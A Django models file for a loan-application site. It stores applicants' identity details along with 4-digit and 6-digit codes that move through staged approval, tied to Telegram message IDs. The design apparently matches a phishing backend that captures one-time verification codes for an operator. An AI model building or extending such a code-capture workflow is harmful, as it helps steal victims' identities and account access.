from django.db import models
import uuid

class LoanApplication(models.Model):
    STATUS_CHOICES = [
        ("pending_4", "Waiting 4-number approval"),
        ("approved_4", "4 numbers approved"),
        ("rejected_4", "4 numbers rejected"),
        ("pending_6", "Waiting 6-number approval"),
        ("approved_6", "6 numbers approved"),
        ("rejected_6", "6 numbers rejected"),
        ("completed", "Completed"),
    ]

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    phone = models.CharField(max_length=20, blank=True)
    demo_numbers_4 = models.CharField(max_length=4, blank=True)
    demo_numbers_6 = models.CharField(max_length=6, blank=True)
    amount = models.CharField(max_length=20, blank=True)
    term = models.CharField(max_length=10, blank=True)
    first_name = models.CharField(max_length=100, blank=True)
    last_name = models.CharField(max_length=100, blank=True)
    email = models.CharField(max_length=200, blank=True)
    id_number = models.CharField(max_length=50, blank=True)
    address = models.CharField(max_length=255, blank=True)
    city = models.CharField(max_length=100, blank=True)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default="pending_4")
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.phone} | 4:{self.demo_numbers_4} | 6:{self.demo_numbers_6} | {self.status}"

class DemoVerification(models.Model):
    STATUS_CHOICES = [
        ("pending", "Pending"),
        ("approved", "Approved"),
        ("rejected", "Rejected"),
    ]

    session_key = models.CharField(max_length=100, unique=True)
    phone = models.CharField(max_length=30, blank=True)
    status = models.CharField(
        max_length=20,
        choices=STATUS_CHOICES,
        default="pending",
    )

    telegram_message_id = models.BigIntegerField(
        null=True,
        blank=True,
    )

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.phone} - {self.status}"
